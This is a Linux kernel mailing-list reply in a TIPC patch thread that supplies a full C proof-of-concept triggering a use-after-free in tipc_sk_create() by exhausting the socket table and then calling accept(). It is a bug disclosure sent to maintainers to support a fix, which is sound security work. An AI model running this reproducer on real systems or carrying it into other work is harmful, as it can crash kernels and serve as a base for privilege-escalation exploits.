Return-Path: <netdev+bounces-306441-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by mail.lfdr.de with LMTP
	id YRn2C82HUGpO0wIAu9opvQ
	(envelope-from <netdev+bounces-306441-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Fri, 10 Jul 2026 07:49:01 +0200
X-Original-To: lists+netdev@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
	by mail.lfdr.de (Postfix) with ESMTPS id 6FCC973768E
	for <lists+netdev@lfdr.de>; Fri, 10 Jul 2026 07:49:00 +0200 (CEST)
Authentication-Results: mail.lfdr.de;
	dkim=pass header.d=gmail.com header.s=20251104 header.b=ZOGWYle6;
	dmarc=pass (policy=none) header.from=gmail.com;
	spf=pass (mail.lfdr.de: domain of "netdev+bounces-306441-lists+netdev=lfdr.de@vger.kernel.org" designates 172.234.253.10 as permitted sender) smtp.mailfrom="netdev+bounces-306441-lists+netdev=lfdr.de@vger.kernel.org";
	arc=pass ("subspace.kernel.org:s=arc-20240116:i=1")
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id 20E8B3010BA1
	for <lists+netdev@lfdr.de>; Fri, 10 Jul 2026 05:48:59 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 634A238228C;
	Fri, 10 Jul 2026 05:48:58 +0000 (UTC)
X-Original-To: netdev@vger.kernel.org
Received: from mail-pj1-f49.google.com (mail-pj1-f49.google.com [209.85.216.49])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 09D4531E853
	for <netdev@vger.kernel.org>; Fri, 10 Jul 2026 05:48:56 +0000 (UTC)
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1783662538; cv=none; b=GpZktyXKmaP6jHDVNg1ppuw3Bxm9QEwG8xw6st749I3VYICJUth4Q56j0waox98x2qlb4DmFP46wXDMXKVX5iFbCOclCWHE6/+YcAKoDE7N8ajbWWTj8pfuTEEDn2Df/XpMVwOL1/HCvdBUrtZCCths8UTsHYQiLbbxkKL0zqGE=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1783662538; c=relaxed/simple;
	bh=MOtOYp7sW8HYnB7HJ3MKYD5DYJRtwirDuPHlckMd2bg=;
	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
	 MIME-Version; b=JoBr/AvlNc+6r02cVxZHcXHt1ZhtZG/0NAdp4LLwvOkXZUpzTw4zNxHi6rRQOiQcgCKgMpoQgxoRYvvwVBcXPPR421jsu+BUK4F62FfUh/FEXifW6chrnTpKZ2JpkarEzrHWvyaWm2QmJYpISikjfbe4WaFLkkQbeUBbyl5fmyM=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=ZOGWYle6; arc=none smtp.client-ip=209.85.216.49
Received: by mail-pj1-f49.google.com with SMTP id 98e67ed59e1d1-37e0a189b0bso562522a91.1
        for <netdev@vger.kernel.org>; Thu, 09 Jul 2026 22:48:56 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1783662536; x=1784267336; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:references:in-reply-to
         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=vshExmACqo4o+e1KjGRalp/CjfYkXQ/9vg4sj4m5Q18=;
        b=ZOGWYle6qhof30ngofURWU8DD0XFdjO3kuGW98ZLRxyo/0M1Ygyz4mF1Ulq5cP/bds
         NhAD1S3P9azCIHMoF4z1emMHtzVDAGnYFHUZFMF1VS9GgHigbO3tMwPfEs5YCh8SFkJG
         BJ4BMdXJqODaeAOxzj16WAU96sk3NhZKrAsr3VltKRRpR22oV0U1KRAul3ZB5KOYlJpH
         Ek/PVQO45GEVDRRW/Bz75gWxYVBrwe34PtYj0OtbRl5Xga79Jj37oo8YDjJVT8zZwUXd
         70X5n12uN/6Rq1fGpIsrlpm/LNZWkX8gTB6RqBTzAMPROqYUZOIcCeqivQ7JwUQ3dGhu
         rg4Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1783662536; x=1784267336;
        h=content-transfer-encoding:mime-version:references:in-reply-to
         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to:content-type;
        bh=vshExmACqo4o+e1KjGRalp/CjfYkXQ/9vg4sj4m5Q18=;
        b=YWoWay8/n+TkRTjBucQjpY8jZQ+cGEsoUxQPdgoTmac1gzs8fDlGbdr2aRn1US5NzT
         ZZo2s55CTfuMJ6zm0whE1KVy66Cz5VoiNf2DQLtHRcSiV6v0cWI/3AUdizXzjZe6CfiP
         BdtK9rLqNDqqaZ0tJwgokLR/rPnjn9WQYaGxAJvw3kvgbrx+HqQj4QLXFi8DZJFsRGQq
         MlYTP9CFLw+K3Lf6wnKrsfcsMXP+TSiqTIsPrDVuH7cPliXeK8BkQ3XztZsABhTCp+37
         FDGqvMecoe+gMBmxhY7J/XQgci1TyzMpD5xXP99ZG7QoMCO7ZQnrTRFJ7HBhr56Ur8lu
         QS3A==
X-Gm-Message-State: AOJu0YxdxoTmjlw203yTsNeXsZCu4pBKzQ+pQvc2NRHCQyGPGHgan3/u
	2txNRtlbhh9/g0xBGEkntqH3OuMfOg4idUwJ1E/64ZRErO1JwmqDsDR9
X-Gm-Gg: AfdE7ckrgCXrFNr8/wjatJz98FU7PGqQHXqQzwRU2XeD90pwRZeNNZGtrZSJnMNJusq
	uLfrz2ZVrSg+XCfM6yOp8ZDyDoOqEUMmoMfoZLbg3zEZv8npmi3ztzAkr0dhuVzHORHUIgmIZrR
	/FCMrp0vixdbV70LGSxB6Z3AzbbvIlCOAE3htlOgHz08os/PJK/imJjrf/pqn8j9eOSUzHiLSpr
	DbYD+xtnbCkWgTQDA9goebmMQ5Khah42Y0Z2HlLMj+/IXTJ2KgQ2Ayx7RLSWPdrrelo6GlNDV3R
	Kvm1RGewhna0vlgLBvhYLxaAYtl98642hXA/bkSn84lxnGeI+6ezUsdHGqyyKbX7uvaINxEPWJL
	gtEkLvT5//St+OgvMJTWa3u6rT6ZUaNX1u//1TZW3oRroKooRwkK9CPq9ykjhQ1DUI7JaQ/4dvR
	Lwzpll5Tjiu3wVV4lXe7keWHsy1xSVQYlly9s=
X-Received: by 2002:a17:90b:4ac7:b0:381:12d5:1ab5 with SMTP id 98e67ed59e1d1-3893d33aa6fmr10333769a91.0.1783662536061;
        Thu, 09 Jul 2026 22:48:56 -0700 (PDT)
Received: from ancienth-X870E-Nova-WiFi ([125.186.72.2])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-38a58792cdasm2186183a91.16.2026.07.09.22.48.52
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 09 Jul 2026 22:48:55 -0700 (PDT)
From: Daehyeon Ko <4ncienth@gmail.com>
To: Tung Quang Nguyen <tung.quang.nguyen@est.tech>
Cc: netdev@vger.kernel.org,
	Jon Maloy <jmaloy@redhat.com>,
	"David S . Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>,
	tipc-discussion@lists.sourceforge.net,
	linux-kernel@vger.kernel.org,
	Daehyeon Ko <4ncienth@gmail.com>
Subject: Re: [PATCH net] tipc: clear sock->sk on the failed-insert path in tipc_sk_create()
Date: Fri, 10 Jul 2026 14:48:15 +0900
Message-ID: <20260710054815.3995322-1-4ncienth@gmail.com>
X-Mailer: git-send-email 2.54.0
In-Reply-To: <GV1P189MB19888A8F810E5DB896F9BAD5C6FD2@GV1P189MB1988.EURP189.PROD.OUTLOOK.COM>
References: <GV1P189MB19888A8F810E5DB896F9BAD5C6FD2@GV1P189MB1988.EURP189.PROD.OUTLOOK.COM>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-Rspamd-Action: no action
X-Spamd-Result: default: False [-0.66 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	MID_CONTAINS_FROM(1.00)[];
	R_MISSING_CHARSET(0.50)[];
	DMARC_POLICY_ALLOW(-0.50)[gmail.com,none];
	R_DKIM_ALLOW(-0.20)[gmail.com:s=20251104];
	R_SPF_ALLOW(-0.20)[+ip4:172.234.253.10:c];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	FORWARDED(0.00)[lists@lfdr.de];
	TO_DN_SOME(0.00)[];
	FREEMAIL_CC(0.00)[vger.kernel.org,redhat.com,davemloft.net,google.com,kernel.org,lists.sourceforge.net,gmail.com];
	MIME_TRACE(0.00)[0:+];
	TAGGED_FROM(0.00)[bounces-306441-lists,netdev=lfdr.de];
	FORGED_SENDER_MAILLIST(0.00)[];
	RCVD_TLS_LAST(0.00)[];
	FORGED_RECIPIENTS(0.00)[m:tung.quang.nguyen@est.tech,m:netdev@vger.kernel.org,m:jmaloy@redhat.com,m:davem@davemloft.net,m:edumazet@google.com,m:kuba@kernel.org,m:pabeni@redhat.com,m:horms@kernel.org,m:tipc-discussion@lists.sourceforge.net,m:linux-kernel@vger.kernel.org,m:4ncienth@gmail.com,s:lists@lfdr.de];
	FORGED_SENDER(0.00)[4ncienth@gmail.com,netdev@vger.kernel.org];
	DKIM_TRACE(0.00)[gmail.com:+];
	ASN(0.00)[asn:63949, ipnet:172.234.224.0/19, country:SG];
	FREEMAIL_FROM(0.00)[gmail.com];
	PRECEDENCE_BULK(0.00)[];
	FORGED_SENDER_FORWARDING(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[4ncienth@gmail.com,netdev@vger.kernel.org];
	FROM_HAS_DN(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	RCVD_COUNT_FIVE(0.00)[5];
	RCPT_COUNT_SEVEN(0.00)[11];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	ALIAS_RESOLVED(0.00)[];
	TAGGED_RCPT(0.00)[netdev];
	FORGED_RECIPIENTS_FORWARDING(0.00)[];
	DBL_BLOCKED_OPENRESOLVER(0.00)[vger.kernel.org:from_smtp,sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns]
X-Rspamd-Server: lfdr
X-Rspamd-Queue-Id: 6FCC973768E

Hi Tung,

Here's the reproducer; build/run notes and the insert-failure precondition are
in the header comment. Built with a reduced TIPC_MAX_PORT it hits the KASAN
slab-use-after-free in tipc_release() within a few hundred sockets; on a stock
kernel the same path is reached at the rhashtable max (~2M sockets in the netns).

// PoC: tipc_sk_create() dangling-sk use-after-free write on the accept() path.
//
// Build:  gcc -O2 -o poc poc-tipc.c
// Run:    as root, inside a netns with TIPC available; kernel built CONFIG_TIPC=y
//         + CONFIG_KASAN=y to observe the UAF.
//
// The tipc_sk_insert() failure is reached when the per-netns socket rhashtable
// hits its max_size (~2M sockets). To make that precondition cheap to trigger,
// build the kernel with a reduced TIPC_MAX_PORT (e.g. 0xff): the UAF code path
// (tipc_sk_create error / tipc_accept / tipc_release) is UNMODIFIED, only the
// search space is bounded. On a stock kernel the bug is identical, only the
// precondition is more expensive (~2M sockets in the netns).
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/socket.h>

#define LOG(...) do{printf("[poc] " __VA_ARGS__);printf("\n");fflush(stdout);}while(0)
#ifndef AF_TIPC
#define AF_TIPC 30
#endif
#define TIPC_SERVICE_ADDR 2
#define TIPC_NODE_SCOPE   3
#define TIPC_CLUSTER_SCOPE 2

struct tipc_service_addr { uint32_t type; uint32_t instance; };
struct tipc_socket_addr  { uint32_t ref;  uint32_t node; };
struct tipc_service_range{ uint32_t type; uint32_t lower; uint32_t upper; };
struct sockaddr_tipc {
    unsigned short family;
    unsigned char  addrtype;
    signed   char  scope;
    union {
        struct tipc_socket_addr id;
        struct tipc_service_range nameseq;
        struct { struct tipc_service_addr name; uint32_t domain; } name;
    } addr;
};

#define SVC_TYPE 0x1000u
#define SVC_INST 1u

static void mk_svc(struct sockaddr_tipc *a, signed char scope){
    memset(a,0,sizeof(*a));
    a->family=AF_TIPC; a->addrtype=TIPC_SERVICE_ADDR; a->scope=scope;
    a->addr.name.name.type=SVC_TYPE; a->addr.name.name.instance=SVC_INST; a->addr.name.domain=0;
}

int main(void){
    LOG("BEGIN tipc_sk_create dangling-sk UAF (accept path; insert-failure precondition)");
    int lst=socket(AF_TIPC,SOCK_STREAM,0);
    if(lst<0){LOG("SETUP_FAIL socket(AF_TIPC) errno=%d (CONFIG_TIPC?)",errno);return 0;}
    struct sockaddr_tipc sa; mk_svc(&sa,TIPC_NODE_SCOPE);
    if(bind(lst,(struct sockaddr*)&sa,sizeof(sa))<0){LOG("SETUP_FAIL bind errno=%d",errno);return 0;}
    if(listen(lst,64)<0){LOG("SETUP_FAIL listen errno=%d",errno);return 0;}
    LOG("listener bound+listening");

    int cli=socket(AF_TIPC,SOCK_STREAM,0);
    if(cli<0){LOG("SETUP_FAIL client socket errno=%d",errno);return 0;}
    fcntl(cli,F_SETFL,fcntl(cli,F_GETFL,0)|O_NONBLOCK);
    struct sockaddr_tipc ca; mk_svc(&ca,TIPC_CLUSTER_SCOPE);
    int rc=connect(cli,(struct sockaddr*)&ca,sizeof(ca));
    LOG("client connect rc=%d errno=%d (EINPROGRESS ok)", rc, errno);
    usleep(200000); /* let the intra-node connect reach the accept queue */

    /* make tipc_sk_insert() fail: on a reduced-TIPC_MAX_PORT build this exhausts
       the port space in a few hundred sockets; on stock this is the ~2M path */
    static int fd[1<<21]; int nf=0, lasterr=0;
    for(int i=0;i<(1<<21);i++){
        int s=socket(AF_TIPC,SOCK_STREAM,0);
        if(s<0){ lasterr=errno; break; }
        fd[nf++]=s;
    }
    LOG("port-fill: created %d sockets, then socket() failed errno=%d", nf, lasterr);

    struct sockaddr_tipc na; socklen_t nl=sizeof(na);
    LOG("FIRE accept() (expect tipc_sk_create->tipc_sk_insert fail -> tipc_release UAF)");
    int ns=accept(lst,(struct sockaddr*)&na,&nl);
    LOG("accept rc=%d errno=%d (EINVAL = tipc_sk_create failed; UAF in __sock_release path)", ns, errno);
    if(ns>=0) close(ns);
    for(int k=0;k<8;k++){ int n2=accept(lst,(struct sockaddr*)&na,&nl); if(n2>=0)close(n2); }
    LOG("POC_DONE");
    return 0;
}

Thanks,
Daehyeon

